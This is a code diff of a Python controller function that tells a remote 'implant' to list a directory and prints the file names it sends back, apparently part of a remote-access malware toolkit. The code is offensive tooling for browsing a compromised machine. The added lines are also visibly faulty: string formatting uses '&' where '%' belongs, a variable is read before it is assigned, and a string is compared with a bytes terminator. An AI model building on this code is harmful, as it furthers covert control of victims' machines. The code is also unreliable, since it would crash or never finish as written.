@@ -11,28 +11,32 @@ DIR = 3
 def dirList(sock, dirPath):
     try:
         # First tell our implant we want a DIR list performed
-        print("Sending command...")
+        print("Sending command...\n")
         sock.send(bytes(str(DIR), "utf-8") + b'\x00')
 
         # Send filepath to write to 
-        print("Sending dir path...")
+        print("Sending dir path...\n")
         sock.send(dirPath + b'\x00')
 
-        # Wait for response (should be success code)
+        print("Files in %s:\n" & dirPath)
+
+        # Keep getting files back until we get our terminator
+        while (data != b'\x00\x00'):
+            data = sock.recv(1024)
+            data = data.strip()
+            data = data.decode('utf-8')
+            print("%s\n" % data)
+
+        # Recieved our terminator so now should receive SUCCESS...
         data = sock.recv(1024)
         data = data.strip()
         data = data.decode('utf-8')
 
         if (data == "SUCCESS"):
-            print("Successful dirl ist! Getting directory contents...")
-            data = sock.recv(1024)
-            data = data.strip()
-            data = data.decode('utf-8')
-
-            # TODO: handle per file? try to cluster them then add stop code in implant to tell us theres not any more?
+            print("Successful dirl ist!\n")
 
         else:
-            print("Implant returned FAILURE!")
+            print("Implant returned FAILURE!\n")
 
 
     except Exception as e:
